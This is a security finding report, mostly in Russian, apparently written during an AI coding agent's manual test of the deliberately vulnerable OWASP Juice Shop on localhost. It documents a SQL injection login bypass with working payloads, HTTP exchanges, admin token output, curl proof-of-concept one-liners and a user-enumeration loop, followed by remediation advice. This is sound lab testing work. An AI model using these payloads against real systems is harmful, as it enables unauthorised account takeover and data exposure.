# Finding: SQL Injection — Login Bypass (Admin Account Takeover)

**Дата:** 2026-04-12  
**Таргет:** OWASP Juice Shop — http://localhost:3000  
**Агент:** manual (Claude Code без спец-skills)  
**Статус:** CONFIRMED EXPLOITABLE

---

## Severity

| | |
|---|---|
| **CVSS 3.1** | 9.8 (Critical) |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **OWASP** | A03:2021 – Injection |

---

## Описание

Endpoint `POST /rest/user/login` передаёт значение поля `email` напрямую в SQL-запрос без параметризации. Атакующий без каких-либо учётных данных может обойти аутентификацию и получить JWT-токен администратора, используя классические SQLi-payload в поле email.

**Тип уязвимости:** In-band SQL Injection (Boolean-based / tautology)  
**БД:** SQLite

---

## Запросы и ответы

### Базовый запрос (контроль)

```
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"test@test.com","password":"test"}
```

```
HTTP/1.1 401 Unauthorized
Invalid email or password.
```

---

### Payload 1: `' OR 1=1--` → УСПЕХ (HTTP 200)

```
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"' OR 1=1--","password":"x"}
```

```json
HTTP/1.1 200 OK

{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

**JWT payload (декодирован):**
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin"
  }
}
```

**Примечание:** `password` в JWT — MD5-хэш пароля администратора, раскрывается в токене.

---

### Payload 2: `admin@juice-sh.op` с неверным паролем → FAIL (401)

```
{"email":"admin@juice-sh.op","password":"wrongpassword"}
→ 401 Invalid email or password.
```

Прямой ввод email без пароля не работает — пароль реально проверяется при обычном входе.

---

### Payload 3: `admin@juice-sh.op'--` → УСПЕХ (HTTP 200)

```
{"email":"admin@juice-sh.op'--","password":"x"}
→ 200 OK | umail: admin@juice-sh.op
```

Целевой bypass: знаем email — пропускаем проверку пароля через SQL-комментарий.

---

### Payload 4: `' OR TRUE--` → УСПЕХ (HTTP 200)

```
{"email":"' OR TRUE--","password":"x"}
→ 200 OK | umail: admin@juice-sh.op
```

Альтернативный tautology payload.

---

### Payload 5: `' OR 1=1 LIMIT 1 OFFSET 2--` → УСПЕХ (HTTP 200, другой пользователь)

```
{"email":"' OR 1=1 LIMIT 1 OFFSET 2--","password":"x"}
→ 200 OK | umail: bender@juice-sh.op (id=3, role=customer)
```

OFFSET позволяет перебирать пользователей по порядку — это user enumeration через SQLi.

---

## Подтверждение привилегий

С полученным admin JWT-токеном:

### GET /rest/admin/application-configuration → 200 OK
```json
{"config": {"server": {"port": 3000, ...}, "application": {"name": "OWASP Juice Shop"...}}}
```

### GET /rest/user/authentication-details/ → 200 OK
Возвращает список всех 21 пользователя с замаскированными паролями (`****`).

### GET /api/Users/ → 200 OK
21 пользователь, среди них 5 с ролью `admin`:

| id | role | email |
|----|------|-------|
| 1 | admin | admin@juice-sh.op |
| 4 | admin | bjoern.kimminich@gmail.com |
| 6 | admin | support@juice-sh.op |
| 9 | admin | J12934@juice-sh.op |
| 10 | admin | wurstbrot@juice-sh.op |

### GET /api/Feedbacks/ → 200 OK
8 отзывов пользователей, включая частичные email адреса.

---

## PoC (однострочная команда)

```bash
# Получить JWT токен администратора без знания пароля:
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
print('TOKEN:', d['authentication']['token'])
print('USER:', d['authentication']['umail'])
"
```

```bash
# Целевой bypass для известного email:
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"x"}'
```

```bash
# User enumeration через OFFSET:
for i in 0 1 2 3 4; do
  curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1 LIMIT 1 OFFSET ${i}--\",\"password\":\"x\"}" | \
    python3 -c "import sys,json; d=json.loads(sys.stdin.read()); print(f'OFFSET {$i}:', d['authentication']['umail'])"
done
```

---

## Дополнительные наблюдения

1. **MD5-хэш пароля в JWT** — поле `password` в JWT payload содержит MD5-хэш реального пароля администратора (`0192023a7bbd73250516f069df18b500`). Это отдельная Sensitive Data Exposure уязвимость.

2. **5 admin-аккаунтов** — приложение имеет несколько admin-аккаунтов, что расширяет attack surface.

3. **Нет rate limiting** — payload можно отправлять неограниченное количество раз.

4. **CORS: `*`** — SQLi exploit может быть проведён из любого домена через браузер (в сочетании с XSS).

---

## Remediation

| Приоритет | Мера |
|-----------|------|
| CRITICAL | Использовать parameterized queries / prepared statements |
| HIGH | Не включать `password` (даже хэш) в JWT payload |
| HIGH | Внедрить rate limiting на `/rest/user/login` |
| MEDIUM | Ограничить CORS (`Access-Control-Allow-Origin: *` → конкретный домен) |
| LOW | Централизованный audit log для failed/успешных попыток входа |

**Пример исправления (Node.js/Sequelize):**
```javascript
// УЯЗВИМО:
User.findOne({ where: `email = '${email}' AND password = '${hash}'` })

// ИСПРАВЛЕНО:
User.findOne({ where: { email: email, password: hash } })
```
